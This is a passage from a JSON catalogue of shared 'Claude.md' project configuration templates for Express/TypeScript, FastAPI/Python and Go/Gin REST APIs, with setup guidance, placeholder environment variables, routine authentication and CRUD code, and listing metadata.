      "content": "# Claude.md - Node.js Express + TypeScript API\n\n## Project Overview\n\nThis is a RESTful API built with Node.js, Express, and TypeScript, following modern backend development practices with proper error handling, validation, and database integration.\n\n## Technology Stack\n\n- **Runtime**: Node.js\n- **Framework**: Express.js\n- **Language**: TypeScript\n- **Database**: PostgreSQL with Prisma ORM\n- **Authentication**: JWT with bcrypt\n- **Validation**: Zod or Joi\n- **Testing**: Jest with Supertest\n- **Documentation**: Swagger/OpenAPI\n\n## Project Structure\n\n```\nsrc/\n├── controllers/        # Request handlers\n├── middleware/         # Custom middleware\n├── models/            # Database models\n├── routes/            # API routes\n├── services/          # Business logic\n├── utils/             # Utility functions\n├── types/             # TypeScript types\n├── config/            # Configuration files\n└── app.ts            # Express app setup\n```\n\n## Development Guidelines\n\n### Code Style\n- Use TypeScript strict mode\n- Follow REST API conventions\n- Implement proper error handling\n- Use middleware for cross-cutting concerns\n- Follow SOLID principles\n\n### API Design\n- Use consistent naming conventions\n- Implement proper HTTP status codes\n- Use pagination for list endpoints\n- Implement proper filtering and sorting\n- Follow REST resource patterns\n\n### Security\n- Implement authentication and authorization\n- Use HTTPS in production\n- Validate all inputs\n- Implement rate limiting\n- Use security headers\n\n## Key Commands\n\n- `npm run dev` - Start development server with nodemon\n- `npm run build` - Compile TypeScript\n- `npm start` - Start production server\n- `npm test` - Run tests\n- `npm run lint` - Run ESLint\n\n## Environment Variables\n\nCreate a `.env` file:\n```\nNODE_ENV=development\nPORT=3000\nDATABASE_URL=postgresql://user:password@localhost:5432/myapp\nJWT_SECRET=your-super-secret-jwt-key\nBCRYPT_ROUNDS=12\nCORS_ORIGIN=http://localhost:3001\n```\n\n## Common Patterns\n\n### Express App Setup\n```ts\n// src/app.ts\nimport express from 'express';\nimport cors from 'cors';\nimport helmet from 'helmet';\nimport morgan from 'morgan';\nimport { errorHandler } from './middleware/errorHandler';\nimport { notFound } from './middleware/notFound';\nimport authRoutes from './routes/auth';\nimport userRoutes from './routes/users';\n\nconst app = express();\n\n// Middleware\napp.use(helmet());\napp.use(cors({\n  origin: process.env.CORS_ORIGIN || 'http://localhost:3001',\n  credentials: true\n}));\napp.use(morgan('combined'));\napp.use(express.json({ limit: '10mb' }));\napp.use(express.urlencoded({ extended: true }));\n\n// Routes\napp.use('/api/auth', authRoutes);\napp.use('/api/users', userRoutes);\n\n// Error handling\napp.use(notFound);\napp.use(errorHandler);\n\nexport default app;\n```\n\n### Controller Pattern\n```ts\n// src/controllers/userController.ts\nimport { Request, Response, NextFunction } from 'express';\nimport { userService } from '../services/userService';\nimport { CreateUserSchema, UpdateUserSchema } from '../types/user';\n\nexport const userController = {\n  async getUsers(req: Request, res: Response, next: NextFunction) {\n    try {\n      const { page = 1, limit = 10, search } = req.query;\n      const users = await userService.getUsers({\n        page: Number(page),\n        limit: Number(limit),\n        search: search as string\n      });\n      \n      res.json({\n        success: true,\n        data: users,\n        pagination: {\n          page: Number(page),\n          limit: Number(limit),\n          total: users.length\n        }\n      });\n    } catch (error) {\n      next(error);\n    }\n  },\n\n  async createUser(req: Request, res: Response, next: NextFunction) {\n    try {\n      const validatedData = CreateUserSchema.parse(req.body);\n      const user = await userService.createUser(validatedData);\n      \n      res.status(201).json({\n        success: true,\n        data: user,\n        message: 'User created successfully'\n      });\n    } catch (error) {\n      next(error);\n    }\n  },\n\n  async getUserById(req: Request, res: Response, next: NextFunction) {\n    try {\n      const { id } = req.params;\n      const user = await userService.getUserById(id);\n      \n      if (!user) {\n        return res.status(404).json({\n          success: false,\n          message: 'User not found'\n        });\n      }\n      \n      res.json({\n        success: true,\n        data: user\n      });\n    } catch (error) {\n      next(error);\n    }\n  }\n};\n```\n\n### Service Layer\n```ts\n// src/services/userService.ts\nimport { prisma } from '../config/database';\nimport { hashPassword } from '../utils/auth';\nimport type { CreateUserData, UpdateUserData } from '../types/user';\n\nexport const userService = {\n  async getUsers(options: {\n    page: number;\n    limit: number;\n    search?: string;\n  }) {\n    const { page, limit, search } = options;\n    const skip = (page - 1) * limit;\n    \n    const where = search ? {\n      OR: [\n        { name: { contains: search, mode: 'insensitive' } },\n        { email: { contains: search, mode: 'insensitive' } }\n      ]\n    } : {};\n\n    return await prisma.user.findMany({\n      where,\n      skip,\n      take: limit,\n      select: {\n        id: true,\n        name: true,\n        email: true,\n        createdAt: true,\n        updatedAt: true\n      }\n    });\n  },\n\n  async createUser(data: CreateUserData) {\n    const hashedPassword = await hashPassword(data.password);\n    \n    return await prisma.user.create({\n      data: {\n        ...data,\n        password: hashedPassword\n      },\n      select: {\n        id: true,\n        name: true,\n        email: true,\n        createdAt: true\n      }\n    });\n  },\n\n  async getUserById(id: string) {\n    return await prisma.user.findUnique({\n      where: { id },\n      select: {\n        id: true,\n        name: true,\n        email: true,\n        createdAt: true,\n        updatedAt: true\n      }\n    });\n  }\n};\n```\n\n### Authentication Middleware\n```ts\n// src/middleware/auth.ts\nimport { Request, Response, NextFunction } from 'express';\nimport jwt from 'jsonwebtoken';\nimport { prisma } from '../config/database';\n\ninterface AuthRequest extends Request {\n  user?: {\n    id: string;\n    email: string;\n  };\n}\n\nexport const authenticateToken = async (\n  req: AuthRequest,\n  res: Response,\n  next: NextFunction\n) => {\n  const authHeader = req.headers.authorization;\n  const token = authHeader && authHeader.split(' ')[1];\n\n  if (!token) {\n    return res.status(401).json({\n      success: false,\n      message: 'Access token required'\n    });\n  }\n\n  try {\n    const decoded = jwt.verify(token, process.env.JWT_SECRET!) as {\n      userId: string;\n      email: string;\n    };\n\n    const user = await prisma.user.findUnique({\n      where: { id: decoded.userId },\n      select: { id: true, email: true }\n    });\n\n    if (!user) {\n      return res.status(401).json({\n        success: false,\n        message: 'Invalid token'\n      });\n    }\n\n    req.user = user;\n    next();\n  } catch (error) {\n    return res.status(403).json({\n      success: false,\n      message: 'Invalid or expired token'\n    });\n  }\n};\n```\n\n### Error Handling Middleware\n```ts\n// src/middleware/errorHandler.ts\nimport { Request, Response, NextFunction } from 'express';\nimport { ZodError } from 'zod';\n\nexport const errorHandler = (\n  error: any,\n  req: Request,\n  res: Response,\n  next: NextFunction\n) => {\n  console.error('Error:', error);\n\n  // Validation errors\n  if (error instanceof ZodError) {\n    return res.status(400).json({\n      success: false,\n      message: 'Validation error',\n      errors: error.errors.map(err => ({\n        field: err.path.join('.'),\n        message: err.message\n      }))\n    });\n  }\n\n  // Database errors\n  if (error.code === 'P2002') {\n    return res.status(409).json({\n      success: false,\n      message: 'Resource already exists'\n    });\n  }\n\n  // Default error\n  res.status(error.statusCode || 500).json({\n    success: false,\n    message: error.message || 'Internal server error',\n    ...(process.env.NODE_ENV === 'development' && { stack: error.stack })\n  });\n};\n```\n\n### Route Definition\n```ts\n// src/routes/users.ts\nimport { Router } from 'express';\nimport { userController } from '../controllers/userController';\nimport { authenticateToken } from '../middleware/auth';\nimport { validateRequest } from '../middleware/validation';\nimport { CreateUserSchema, UpdateUserSchema } from '../types/user';\n\nconst router = Router();\n\nrouter.get('/', userController.getUsers);\nrouter.post('/', validateRequest(CreateUserSchema), userController.createUser);\nrouter.get('/:id', userController.getUserById);\nrouter.put('/:id', authenticateToken, validateRequest(UpdateUserSchema), userController.updateUser);\nrouter.delete('/:id', authenticateToken, userController.deleteUser);\n\nexport default router;\n```\n\n## Testing\n\n- Use Jest for unit and integration tests\n- Test controllers, services, and middleware\n- Use Supertest for API endpoint testing\n- Mock database calls in unit tests\n- Use test database for integration tests\n\n## Database\n\n- Use Prisma ORM for database operations\n- Implement proper database migrations\n- Use database transactions for complex operations\n- Implement proper indexing\n- Use connection pooling\n\n## Deployment\n\n- Use PM2 for process management\n- Set up proper logging with Winston\n- Implement health check endpoints\n- Use environment-specific configurations\n- Set up monitoring and alerting",
      "tags": [
        {
          "tag": {
            "id": "nodejs",
            "name": "nodejs",
            "slug": "nodejs"
          }
        },
        {
          "tag": {
            "id": "express",
            "name": "express",
            "slug": "express"
          }
        },
        {
          "tag": {
            "id": "typescript",
            "name": "typescript",
            "slug": "typescript"
          }
        },
        {
          "tag": {
            "id": "rest-api",
            "name": "rest-api",
            "slug": "rest-api"
          }
        },
        {
          "tag": {
            "id": "backend",
            "name": "backend",
            "slug": "backend"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 52,
        "copies": 119
      },
      "_count": {
        "votes": 15,
        "copies": 139
      },
      "difficulty": "INTERMEDIATE",
      "language": "TypeScript",
      "framework": "Express.js",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "fastapi-python",
      "title": "FastAPI + Python + SQLAlchemy",
      "slug": "fastapi-python-sqlalchemy",
      "tagline": "FastAPI configuration for intermediate developers",
      "description": "High-performance Python API with FastAPI, SQLAlchemy ORM, and modern Python development practices.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - FastAPI + Python + SQLAlchemy API\n\n## Project Overview\n\nThis is a high-performance Python API built with FastAPI, SQLAlchemy ORM, and Pydantic for data validation, following modern Python development practices.\n\n## Technology Stack\n\n- **Framework**: FastAPI\n- **Language**: Python 3.11+\n- **ORM**: SQLAlchemy 2.0 with async support\n- **Validation**: Pydantic V2\n- **Database**: PostgreSQL\n- **Authentication**: OAuth2 with JWT\n- **Testing**: Pytest with async support\n- **Documentation**: Auto-generated OpenAPI/Swagger\n\n## Project Structure\n\n```\napp/\n├── api/               # API routes\n│   ├── v1/           # API version 1\n│   └── dependencies.py # Route dependencies\n├── core/             # Core configuration\n├── crud/             # Database operations\n├── db/               # Database setup\n├── models/           # SQLAlchemy models\n├── schemas/          # Pydantic schemas\n├── services/         # Business logic\n├── utils/            # Utility functions\n└── main.py          # FastAPI app setup\n```\n\n## Development Guidelines\n\n### Code Style\n- Follow PEP 8 style guide\n- Use type hints throughout\n- Use async/await for I/O operations\n- Follow REST API conventions\n- Use Pydantic for data validation\n\n### API Design\n- Use automatic API documentation\n- Implement proper HTTP status codes\n- Use dependency injection\n- Implement proper error handling\n- Use background tasks for long operations\n\n### Performance\n- Use async database operations\n- Implement connection pooling\n- Use caching where appropriate\n- Optimize database queries\n- Use pagination for large datasets\n\n## Key Commands\n\n- `uvicorn app.main:app --reload` - Start development server\n- `pytest` - Run tests\n- `black .` - Format code\n- `mypy .` - Type checking\n- `flake8 .` - Linting\n\n## Environment Variables\n\nCreate a `.env` file:\n```\nDATABASE_URL=postgresql+asyncpg://user:password@localhost/dbname\nSECRET_KEY=your-super-secret-key\nALGORITHM=HS256\nACCESS_TOKEN_EXPIRE_MINUTES=30\nENVIRONMENT=development\n```\n\n## Common Patterns\n\n### FastAPI App Setup\n```python\n# app/main.py\nfrom fastapi import FastAPI, Request\nfrom fastapi.middleware.cors import CORSMiddleware\nfrom contextlib import asynccontextmanager\n\nfrom app.api.v1.api import api_router\nfrom app.core.config import settings\nfrom app.db.init_db import init_db\n\n\n@asynccontextmanager\nasync def lifespan(app: FastAPI):\n    # Startup\n    await init_db()\n    yield\n    # Shutdown\n    pass\n\n\napp = FastAPI(\n    title=settings.PROJECT_NAME,\n    openapi_url=f\"{settings.API_V1_STR}/openapi.json\",\n    lifespan=lifespan\n)\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=settings.BACKEND_CORS_ORIGINS,\n    allow_credentials=True,\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n)\n\napp.include_router(api_router, prefix=settings.API_V1_STR)\n\n\n@app.get(\"/\")\nasync def root():\n    return {\"message\": \"Hello World\"}\n\n\n@app.get(\"/health\")\nasync def health_check():\n    return {\"status\": \"healthy\"}\n```\n\n### Pydantic Schemas\n```python\n# app/schemas/user.py\nfrom pydantic import BaseModel, EmailStr, Field\nfrom datetime import datetime\nfrom typing import Optional\n\n\nclass UserBase(BaseModel):\n    email: EmailStr\n    name: str = Field(..., min_length=1, max_length=100)\n    is_active: bool = True\n\n\nclass UserCreate(UserBase):\n    password: str = Field(..., min_length=8)\n\n\nclass UserUpdate(BaseModel):\n    email: Optional[EmailStr] = None\n    name: Optional[str] = Field(None, min_length=1, max_length=100)\n    is_active: Optional[bool] = None\n\n\nclass UserInDBBase(UserBase):\n    id: int\n    created_at: datetime\n    updated_at: datetime\n\n    class Config:\n        from_attributes = True\n\n\nclass User(UserInDBBase):\n    pass\n\n\nclass UserInDB(UserInDBBase):\n    hashed_password: str\n```\n\n### SQLAlchemy Models\n```python\n# app/models/user.py\nfrom sqlalchemy import Boolean, Column, Integer, String, DateTime\nfrom sqlalchemy.sql import func\nfrom app.db.base_class import Base\n\n\nclass User(Base):\n    id = Column(Integer, primary_key=True, index=True)\n    email = Column(String, unique=True, index=True, nullable=False)\n    name = Column(String, nullable=False)\n    hashed_password = Column(String, nullable=False)\n    is_active = Column(Boolean, default=True)\n    created_at = Column(DateTime(timezone=True), server_default=func.now())\n    updated_at = Column(DateTime(timezone=True), onupdate=func.now())\n```\n\n### CRUD Operations\n```python\n# app/crud/user.py\nfrom typing import List, Optional\nfrom sqlalchemy.ext.asyncio import AsyncSession\nfrom sqlalchemy import select\nfrom app.crud.base import CRUDBase\nfrom app.models.user import User\nfrom app.schemas.user import UserCreate, UserUpdate\nfrom app.core.security import get_password_hash, verify_password\n\n\nclass CRUDUser(CRUDBase[User, UserCreate, UserUpdate]):\n    async def get_by_email(\n        self, db: AsyncSession, *, email: str\n    ) -> Optional[User]:\n        result = await db.execute(select(User).where(User.email == email))\n        return result.scalar_one_or_none()\n\n    async def create(self, db: AsyncSession, *, obj_in: UserCreate) -> User:\n        hashed_password = get_password_hash(obj_in.password)\n        db_obj = User(\n            email=obj_in.email,\n            name=obj_in.name,\n            hashed_password=hashed_password,\n            is_active=obj_in.is_active,\n        )\n        db.add(db_obj)\n        await db.commit()\n        await db.refresh(db_obj)\n        return db_obj\n\n    async def authenticate(\n        self, db: AsyncSession, *, email: str, password: str\n    ) -> Optional[User]:\n        user = await self.get_by_email(db, email=email)\n        if not user:\n            return None\n        if not verify_password(password, user.hashed_password):\n            return None\n        return user\n\n    async def is_active(self, user: User) -> bool:\n        return user.is_active\n\n\nuser = CRUDUser(User)\n```\n\n### API Routes\n```python\n# app/api/v1/endpoints/users.py\nfrom typing import List\nfrom fastapi import APIRouter, Depends, HTTPException, status\nfrom sqlalchemy.ext.asyncio import AsyncSession\n\nfrom app.api import dependencies\nfrom app.crud import user as crud_user\nfrom app.schemas.user import User, UserCreate, UserUpdate\nfrom app.models.user import User as UserModel\n\nrouter = APIRouter()\n\n\n@router.get(\"/\", response_model=List[User])\nasync def read_users(\n    skip: int = 0,\n    limit: int = 100,\n    db: AsyncSession = Depends(dependencies.get_db),\n    current_user: UserModel = Depends(dependencies.get_current_active_user),\n):\n    \"\"\"\n    Retrieve users.\n    \"\"\"\n    users = await crud_user.user.get_multi(db, skip=skip, limit=limit)\n    return users\n\n\n@router.post(\"/\", response_model=User, status_code=status.HTTP_201_CREATED)\nasync def create_user(\n    *,\n    db: AsyncSession = Depends(dependencies.get_db),\n    user_in: UserCreate,\n):\n    \"\"\"\n    Create new user.\n    \"\"\"\n    user = await crud_user.user.get_by_email(db, email=user_in.email)\n    if user:\n        raise HTTPException(\n            status_code=400,\n            detail=\"User with this email already exists\",\n        )\n    user = await crud_user.user.create(db, obj_in=user_in)\n    return user\n\n\n@router.get(\"/{user_id}\", response_model=User)\nasync def read_user(\n    user_id: int,\n    db: AsyncSession = Depends(dependencies.get_db),\n    current_user: UserModel = Depends(dependencies.get_current_active_user),\n):\n    \"\"\"\n    Get user by ID.\n    \"\"\"\n    user = await crud_user.user.get(db, id=user_id)\n    if not user:\n        raise HTTPException(\n            status_code=404,\n            detail=\"User not found\",\n        )\n    return user\n```\n\n### Authentication Dependencies\n```python\n# app/api/dependencies.py\nfrom typing import AsyncGenerator\nfrom fastapi import Depends, HTTPException, status\nfrom fastapi.security import OAuth2PasswordBearer\nfrom jose import JWTError, jwt\nfrom sqlalchemy.ext.asyncio import AsyncSession\n\nfrom app.core import security\nfrom app.core.config import settings\nfrom app.crud import user as crud_user\nfrom app.db.session import async_session\nfrom app.models.user import User\n\noauth2_scheme = OAuth2PasswordBearer(\n    tokenUrl=f\"{settings.API_V1_STR}/auth/login\"\n)\n\n\nasync def get_db() -> AsyncGenerator[AsyncSession, None]:\n    async with async_session() as session:\n        yield session\n\n\nasync def get_current_user(\n    db: AsyncSession = Depends(get_db),\n    token: str = Depends(oauth2_scheme),\n) -> User:\n    credentials_exception = HTTPException(\n        status_code=status.HTTP_401_UNAUTHORIZED,\n        detail=\"Could not validate credentials\",\n        headers={\"WWW-Authenticate\": \"Bearer\"},\n    )\n    \n    try:\n        payload = jwt.decode(\n            token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM]\n        )\n        user_id: int = payload.get(\"sub\")\n        if user_id is None:\n            raise credentials_exception\n    except JWTError:\n        raise credentials_exception\n    \n    user = await crud_user.user.get(db, id=user_id)\n    if user is None:\n        raise credentials_exception\n    return user\n\n\nasync def get_current_active_user(\n    current_user: User = Depends(get_current_user),\n) -> User:\n    if not crud_user.user.is_active(current_user):\n        raise HTTPException(\n            status_code=400, \n            detail=\"Inactive user\"\n        )\n    return current_user\n```\n\n### Background Tasks\n```python\n# app/services/email.py\nfrom fastapi import BackgroundTasks\nimport smtplib\nfrom email.mime.text import MIMEText\n\n\ndef send_email_background(\n    background_tasks: BackgroundTasks,\n    email: str,\n    subject: str,\n    body: str,\n):\n    background_tasks.add_task(send_email, email, subject, body)\n\n\ndef send_email(email: str, subject: str, body: str):\n    # Email sending logic\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = 'noreply@example.com'\n    msg['To'] = email\n    \n    # Send email using SMTP\n    with smtplib.SMTP('localhost') as server:\n        server.send_message(msg)\n```\n\n## Testing\n\n- Use pytest with async support\n- Test API endpoints with TestClient\n- Use database fixtures for testing\n- Mock external dependencies\n- Test both success and error scenarios\n\n## Database\n\n- Use async SQLAlchemy for better performance\n- Implement proper database migrations with Alembic\n- Use connection pooling\n- Implement proper indexing\n- Handle database transactions properly\n\n## Deployment\n\n- Use Docker for containerization\n- Deploy with Gunicorn + Uvicorn workers\n- Set up proper logging\n- Implement health checks\n- Use environment-specific settings",
      "tags": [
        {
          "tag": {
            "id": "python",
            "name": "python",
            "slug": "python"
          }
        },
        {
          "tag": {
            "id": "fastapi",
            "name": "fastapi",
            "slug": "fastapi"
          }
        },
        {
          "tag": {
            "id": "sqlalchemy",
            "name": "sqlalchemy",
            "slug": "sqlalchemy"
          }
        },
        {
          "tag": {
            "id": "pydantic",
            "name": "pydantic",
            "slug": "pydantic"
          }
        },
        {
          "tag": {
            "id": "async",
            "name": "async",
            "slug": "async"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 14,
        "copies": 152
      },
      "_count": {
        "votes": 46,
        "copies": 191
      },
      "difficulty": "INTERMEDIATE",
      "language": "Python",
      "framework": "FastAPI",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "go-gin-api",
      "title": "Go + Gin Framework + GORM",
      "slug": "go-gin-framework-gorm",
      "tagline": "Gin configuration for intermediate developers",
      "description": "Efficient Go REST API with Gin framework, GORM ORM, and Go best practices for high-performance backends.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Go + Gin Framework + GORM API\n\n## Project Overview\n\nThis is a high-performance REST API built with Go, Gin framework, and GORM ORM, following Go best practices for scalable backend development.\n\n## Technology Stack\n\n- **Language**: Go 1.21+\n- **Framework**: Gin Web Framework\n- **ORM**: GORM\n- **Database**: PostgreSQL\n- **Authentication**: JWT\n- **Validation**: go-playground/validator\n- **Testing**: Go built-in testing + testify\n- **Documentation**: Swagger with gin-swagger\n\n## Project Structure\n\n```\n├── cmd/\n│   └── server/\n│       └── main.go      # Application entry point\n├── internal/\n│   ├── config/          # Configuration\n│   ├── controllers/     # HTTP handlers\n│   ├── middleware/      # HTTP middleware\n│   ├── models/          # Database models\n│   ├── repositories/    # Data access layer\n│   ├── services/        # Business logic\n│   └── utils/           # Utility functions\n├── pkg/\n│   ├── database/        # Database connection\n│   ├── logger/          # Logging utilities\n│   └── validator/       # Custom validators\n└── docs/               # Swagger documentation\n```\n\n## Development Guidelines\n\n### Code Style\n- Follow Go conventions and gofmt\n- Use meaningful package names\n- Implement proper error handling\n- Use interfaces for abstraction\n- Follow the single responsibility principle\n\n### API Design\n- Use RESTful endpoints\n- Implement proper HTTP status codes\n- Use middleware for cross-cutting concerns\n- Implement request validation\n- Use structured logging\n\n### Performance\n- Use connection pooling\n- Implement proper caching\n- Use goroutines for concurrent operations\n- Optimize database queries\n- Use profiling for optimization\n\n## Key Commands\n\n- `go run cmd/server/main.go` - Start development server\n- `go build -o bin/server cmd/server/main.go` - Build binary\n- `go test ./...` - Run tests\n- `go mod tidy` - Clean up dependencies\n- `swag init` - Generate Swagger docs\n\n## Environment Variables\n\nCreate a `.env` file:\n```\nPORT=8080\nDB_HOST=localhost\nDB_PORT=5432\nDB_USER=user\nDB_PASSWORD=password\nDB_NAME=dbname\nJWT_SECRET=your-jwt-secret\nGIN_MODE=debug\nLOG_LEVEL=info\n```\n\n## Common Patterns\n\n### Main Application Setup\n```go\n// cmd/server/main.go\npackage main\n\nimport (\n    \"log\"\n    \"os\"\n\n    \"github.com/joho/godotenv\"\n    \"your-app/internal/config\"\n    \"your-app/internal/controllers\"\n    \"your-app/internal/middleware\"\n    \"your-app/pkg/database\"\n    \"your-app/pkg/logger\"\n    \n    \"github.com/gin-gonic/gin\"\n    swaggerFiles \"github.com/swaggo/files\"\n    ginSwagger \"github.com/swaggo/gin-swagger\"\n)\n\nfunc main() {\n    // Load environment variables\n    if err := godotenv.Load(); err != nil {\n        log.Println(\"No .env file found\")\n    }\n\n    // Initialize config\n    cfg := config.Load()\n\n    // Initialize logger\n    logger.Init(cfg.LogLevel)\n\n    // Initialize database\n    db, err := database.Connect(cfg.DatabaseURL)\n    if err != nil {\n        log.Fatal(\"Failed to connect to database:\", err)\n    }\n\n    // Auto-migrate models\n    database.Migrate(db)\n\n    // Initialize Gin router\n    if cfg.Environment == \"production\" {\n        gin.SetMode(gin.ReleaseMode)\n    }\n\n    router := gin.New()\n    router.Use(gin.Logger())\n    router.Use(gin.Recovery())\n    router.Use(middleware.CORS())\n\n    // Initialize controllers\n    userController := controllers.NewUserController(db)\n    authController := controllers.NewAuthController(db)\n\n    // Routes\n    v1 := router.Group(\"/api/v1\")\n    {\n        auth := v1.Group(\"/auth\")\n        {\n            auth.POST(\"/login\", authController.Login)\n            auth.POST(\"/register\", authController.Register)\n        }\n\n        users := v1.Group(\"/users\")\n        users.Use(middleware.AuthRequired())\n        {\n            users.GET(\"\", userController.GetUsers)\n            users.GET(\"/:id\", userController.GetUser)\n            users.PUT(\"/:id\", userController.UpdateUser)\n            users.DELETE(\"/:id\", userController.DeleteUser)\n        }\n    }\n\n    // Swagger documentation\n    router.GET(\"/swagger/*any\", ginSwagger.WrapHandler(swaggerFiles.Handler))\n\n    // Health check\n    router.GET(\"/health\", func(c *gin.Context) {\n        c.JSON(200, gin.H{\"status\": \"healthy\"})\n    })\n\n    // Start server\n    port := os.Getenv(\"PORT\")\n    if port == \"\" {\n        port = \"8080\"\n    }\n\n    log.Printf(\"Server starting on port %s\", port)\n    if err := router.Run(\":\" + port); err != nil {\n        log.Fatal(\"Failed to start server:\", err)\n    }\n}\n```\n\n### Database Models\n```go\n// internal/models/user.go\npackage models\n\nimport (\n    \"time\"\n    \"gorm.io/gorm\"\n)\n\ntype User struct {\n    ID        uint           `json:\"id\" gorm:\"primaryKey\"`\n    Name      string         `json:\"name\" gorm:\"not null\" validate:\"required,min=1,max=100\"`\n    Email     string         `json:\"email\" gorm:\"uniqueIndex;not null\" validate:\"required,email\"`\n    Password  string         `json:\"-\" gorm:\"not null\" validate:\"required,min=8\"`\n    IsActive  bool           `json:\"is_active\" gorm:\"default:true\"`\n    CreatedAt time.Time      `json:\"created_at\"`\n    UpdatedAt time.Time      `json:\"updated_at\"`\n    DeletedAt gorm.DeletedAt `json:\"-\" gorm:\"index\"`\n}\n\ntype CreateUserRequest struct {\n    Name     string `json:\"name\" validate:\"required,min=1,max=100\"`\n    Email    string `json:\"email\" validate:\"required,email\"`\n    Password string `json:\"password\" validate:\"required,min=8\"`\n}\n\ntype UpdateUserRequest struct {\n    Name     *string `json:\"name,omitempty\" validate:\"omitempty,min=1,max=100\"`\n    Email    *string `json:\"email,omitempty\" validate:\"omitempty,email\"`\n    IsActive *bool   `json:\"is_active,omitempty\"`\n}\n\ntype UserResponse struct {\n    ID        uint      `json:\"id\"`\n    Name      string    `json:\"name\"`\n    Email     string    `json:\"email\"`\n    IsActive  bool      `json:\"is_active\"`\n    CreatedAt time.Time `json:\"created_at\"`\n    UpdatedAt time.Time `json:\"updated_at\"`\n}\n\nfunc (u *User) ToResponse() UserResponse {\n    return UserResponse{\n        ID:        u.ID,\n        Name:      u.Name,\n        Email:     u.Email,\n        IsActive:  u.IsActive,\n        CreatedAt: u.CreatedAt,\n        UpdatedAt: u.UpdatedAt,\n    }\n}\n```\n\n### Repository Pattern\n```go\n// internal/repositories/user_repository.go\npackage repositories\n\nimport (\n    \"your-app/internal/models\"\n    \"gorm.io/gorm\"\n)\n\ntype UserRepository interface {\n    Create(user *models.User) error\n    GetByID(id uint) (*models.User, error)\n    GetByEmail(email string) (*models.User, error)\n    GetAll(offset, limit int) ([]models.User, error)\n    Update(user *models.User) error\n    Delete(id uint) error\n    Count() (int64, error)\n}\n\ntype userRepository struct {\n    db *gorm.DB\n}\n\nfunc NewUserRepository(db *gorm.DB) UserRepository {\n    return &userRepository{db: db}\n}\n\nfunc (r *userRepository) Create(user *models.User) error {\n    return r.db.Create(user).Error\n}\n\nfunc (r *userRepository) GetByID(id uint) (*models.User, error) {\n    var user models.User\n    err := r.db.First(&user, id).Error\n    if err != nil {\n        return nil, err\n    }\n    return &user, nil\n}\n\nfunc (r *userRepository) GetByEmail(email string) (*models.User, error) {\n    var user models.User\n    err := r.db.Where(\"email = ?\", email).First(&user).Error\n    if err != nil {\n        return nil, err\n    }\n    return &user, nil\n}\n\nfunc (r *userRepository) GetAll(offset, limit int) ([]models.User, error) {\n    var users []models.User\n    err := r.db.Offset(offset).Limit(limit).Find(&users).Error\n    return users, err\n}\n\nfunc (r *userRepository) Update(user *models.User) error {\n    return r.db.Save(user).Error\n}\n\nfunc (r *userRepository) Delete(id uint) error {\n    return r.db.Delete(&models.User{}, id).Error\n}\n\nfunc (r *userRepository) Count() (int64, error) {\n    var count int64\n    err := r.db.Model(&models.User{}).Count(&count).Error\n    return count, err\n}\n```\n\n### Service Layer\n```go\n// internal/services/user_service.go\npackage services\n\nimport (\n    \"errors\"\n    \"your-app/internal/models\"\n    \"your-app/internal/repositories\"\n    \"your-app/pkg/utils\"\n    \n    \"golang.org/x/crypto/bcrypt\"\n    \"gorm.io/gorm\"\n)\n\ntype UserService interface {\n    CreateUser(req *models.CreateUserRequest) (*models.User, error)\n    GetUser(id uint) (*models.User, error)\n    GetUsers(page, limit int) ([]models.User, int64, error)\n    UpdateUser(id uint, req *models.UpdateUserRequest) (*models.User, error)\n    DeleteUser(id uint) error\n    AuthenticateUser(email, password string) (*models.User, error)\n}\n\ntype userService struct {\n    userRepo repositories.UserRepository\n}\n\nfunc NewUserService(userRepo repositories.UserRepository) UserService {\n    return &userService{\n        userRepo: userRepo,\n    }\n}\n\nfunc (s *userService) CreateUser(req *models.CreateUserRequest) (*models.User, error) {\n    // Check if user already exists\n    existingUser, err := s.userRepo.GetByEmail(req.Email)\n    if err == nil && existingUser != nil {\n        return nil, errors.New(\"user with this email already exists\")\n    }\n\n    // Hash password\n    hashedPassword, err := bcrypt.GenerateFromPassword([]byte(req.Password), bcrypt.DefaultCost)\n    if err != nil {\n        return nil, err\n    }\n\n    user := &models.User{\n        Name:     req.Name,\n        Email:    req.Email,\n        Password: string(hashedPassword),\n        IsActive: true,\n    }\n\n    err = s.userRepo.Create(user)\n    if err != nil {\n        return nil, err\n    }\n\n    return user, nil\n}\n\nfunc (s *userService) GetUser(id uint) (*models.User, error) {\n    return s.userRepo.GetByID(id)\n}\n\nfunc (s *userService) GetUsers(page, limit int) ([]models.User, int64, error) {\n    offset := (page - 1) * limit\n    users, err := s.userRepo.GetAll(offset, limit)\n    if err != nil {\n        return nil, 0, err\n    }\n\n    total, err := s.userRepo.Count()\n    if err != nil {\n        return nil, 0, err\n    }\n\n    return users, total, nil\n}\n\nfunc (s *userService) AuthenticateUser(email, password string) (*models.User, error) {\n    user, err := s.userRepo.GetByEmail(email)\n    if err != nil {\n        if errors.Is(err, gorm.ErrRecordNotFound) {\n            return nil, errors.New(\"invalid credentials\")\n        }\n        return nil, err\n    }\n\n    err = bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(password))\n    if err != nil {\n        return nil, errors.New(\"invalid credentials\")\n    }\n\n    if !user.IsActive {\n        return nil, errors.New(\"account is deactivated\")\n    }\n\n    return user, nil\n}\n```\n\n### HTTP 